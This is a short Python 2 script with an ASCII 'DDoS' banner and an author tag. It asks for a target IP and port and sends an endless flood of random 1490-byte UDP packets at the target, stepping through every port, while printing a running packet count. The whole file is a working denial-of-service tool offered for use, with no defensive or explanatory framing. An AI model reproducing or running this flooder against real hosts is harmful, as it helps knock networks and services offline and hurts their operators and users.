#TooLs Created by RHm7z
#Nuub Gue Stah

import os
import sys
import socket
import random

#SET SOCK AND RANDOM
##########################################################
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) ##
bytes = random._urandom(1490)                           ##
##########################################################

os.system("clear")
print
print "     ______   ______   _______  _______                ___   _________  __   "
print "    (  __  \ (  __  \ (  ___  )(  ____ \  |\     /|   /   )  \__   __/ /  \  "
print "    | (  \  )| (  \  )| (   ) || (    \/  | )   ( |  / /) |     ) (    \/) ) "
print "    | |   ) || |   ) || |   | || (_____   | (___) | / (_) (_    | |      | | "
print "    | |   | || |   | || |   | |(_____  )  |  ___  |(____   _)   | |      | | "
print "    | |   ) || |   ) || |   | |      ) |  | (   ) |     ) (     | |      | | "
print "    | (__/  )| (__/  )| (___) |/\____) |  | )   ( |     | |     | |    __) (_"
print "    (______/ (______/ (_______)\_______)  |/     \|     (_)     )_(    \____/"
print
print "                              0==> Author RHm7z <==0"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s sampe down port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
